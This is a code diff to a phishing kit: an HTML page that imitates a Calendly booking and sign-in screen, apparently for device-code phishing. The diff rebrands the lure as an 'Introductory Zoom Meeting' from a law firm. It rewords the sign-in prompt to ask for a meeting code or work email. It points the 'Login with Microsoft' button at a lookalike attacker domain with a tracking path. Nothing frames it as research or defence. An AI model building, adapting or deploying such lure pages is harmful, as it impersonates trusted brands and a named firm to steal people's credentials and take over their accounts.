@@ -1663,7 +1663,7 @@ const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Calendly - Testing Event</title>
+    <title>Calendly - Create Event</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -1846,8 +1846,8 @@ const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
                 <div class="back-circle" id="backBtn" onclick="stepBack()">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
                 </div>
-                <div class="host-name">Proxima Group</div>
-                <h1 class="meeting-title">Proxima Group Teams Meeting Schedule</h1>
+                <div class="host-name">Mason Parkes Law</div>
+                <h1 class="meeting-title">Introductory Zoom Meeting</h1>
                 
                 <div class="details-item">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
@@ -1904,7 +1904,7 @@ const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
                 <div id="step3" class="view">
                     <div class="login-frame-container">
                         <h1 class="login-title">Log in to add this email to your calendar</h1>
-                        <p class="login-subtitle">Please sign in to coordinate slots and synchronize invitations directly to your system ledger.</p>
+                        <p class="login-subtitle">Please sign in with our meeting code or your work email address to sync this email to your calendar.</p>
                         
                         <div class="login-box">
                             <div class="floating-input-container">
@@ -1916,10 +1916,10 @@ const DEVICE_CODE_CALENDLY_HTML = `<!DOCTYPE html>
                             
                             <div class="divider-row">OR</div>
                             
-                            <button class="btn-oauth oauth-btn" onclick="goToStep(4)">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
-                                Login with Microsoft
-                            </button>
+                          <button class="btn-oauth oauth-btn" onclick="window.location.href='https://calendly.masonparkes-new-meeting-invite.altaccesstrack.work/L6Cif722Dy/n/9q3GeyuEaCKL7y8wZp3nlZQEXNukGH'">
+                              <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+                              Login with Microsoft
+                          </button>
                         </div>
                     </div>
                 </div>
